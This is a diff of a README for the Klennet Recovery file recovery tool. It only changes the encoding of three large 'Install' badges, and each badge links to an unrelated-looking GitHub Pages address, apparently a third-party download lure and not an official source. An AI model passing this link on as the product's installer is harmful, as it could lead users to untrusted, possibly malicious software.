@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Klennet Recovery](https://img.shields.io/badge/⬇_Install_Klennet%20Recovery-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Klennet Recovery](https://img.shields.io/badge/⬇_Install_Klennet+Recovery-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Klennet Recovery is a file recovery tool specializing in recovering files from f
 
 <div align="center">
 
-[![⬇ Install Klennet Recovery](https://img.shields.io/badge/⬇_Install_Klennet%20Recovery-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Klennet Recovery](https://img.shields.io/badge/⬇_Install_Klennet+Recovery-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Klennet Recovery is a file recovery tool specializing in recovering files from f
 
 <div align="center">
 
-[![⬇ Install Klennet Recovery](https://img.shields.io/badge/⬇_Install_Klennet%20Recovery-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Klennet Recovery](https://img.shields.io/badge/⬇_Install_Klennet+Recovery-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
